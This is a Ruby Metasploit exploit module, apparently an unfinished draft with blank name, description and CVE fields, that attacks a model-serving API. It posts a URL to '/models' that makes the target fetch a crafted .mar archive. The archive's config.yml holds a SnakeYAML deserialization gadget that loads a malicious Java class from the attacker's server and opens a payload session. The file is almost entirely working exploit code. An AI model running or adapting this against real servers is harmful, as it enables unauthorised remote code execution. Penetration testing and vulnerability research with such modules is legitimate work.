##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/zip'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Java
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::Java::HTTP::ClassLoader
  # prepend Msf::Exploit::Remote::AutoCheck

  def initialize(_info = {})
    super(
      'Name' => '',
      'Description' => %q{

      },
      'Author' => [
        'Spencer McIntyre'
      ],
      'References' => [
        [ 'CVE', '' ],
      ],
      'DisclosureDate' => '',
      'License' => MSF_LICENSE,
      'DefaultOptions' => {
        'RPORT' => 8081
      },
      'Targets' => [
        [
          'Automatic', {
            'Platform' => 'java',
            'Arch' => [ARCH_JAVA]
          }
        ],
      ],
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [IOC_IN_LOGS],
        'Reliability' => [REPEATABLE_SESSION]
      }
    )
  end

  def class_name
    'MyScriptEngineFactory'
  end

  def constructor_class
    ::File.binread(::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2022-1471', "#{class_name}.class"))
  end

  def on_request_uri(cli, request)
    agent = request.headers['User-Agent']
    vprint_good("Payload requested by #{cli.peerhost} using #{agent}")

    if request.relative_resource.end_with?('.mar')
      send_response(cli, generate_mar, { 'Content-Type' => 'application/octet-stream' })
      return
    end

    if request.relative_resource.end_with?('services/javax.script.ScriptEngineFactory')
      send_response(cli, class_name, {
        'Content-Type' => 'application/octet-string',
        'Connection' => 'close',
        'Pragma' => 'no-cache'
      })
      return
    end

    super(cli, request)
  end

  def generate_mar
    mri = Rex::Zip::Archive.new
    mri.add_file('model.pt', '')
    mri.add_file('MAR-INF/MANIFEST.json', JSON.generate({
      'createdOn' => '04/10/2023 16:23:53',
      'runtime' => 'python',
      'model' => {
        'modelName' => @mar_filename.delete_suffix('.mar'),
        'serializedFile' => 'model.pt',
        'handler' => 'image_classifier',
        'modelVersion' => '1.0',
        'configFile' => 'config.yml'
      },
      'archiverVersion' => '0.8.2'
    }))
    mri.add_file('config.yml', %( !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["#{get_uri}/"]]]] ))
    mri.pack
  end

  def exploit
    @classloader_uri = start_service

    @mar_filename = rand_text_alphanumeric(rand(8..15)) + '.mar'
    send_request_cgi({
      'method' => 'POST',
      'uri' => '/models',
      'vars_get' => { # *must* be vars_get and not vars_post!
        'url' => "#{get_uri}#{@mar_filename}"
      }
    })
    handler
  end
end
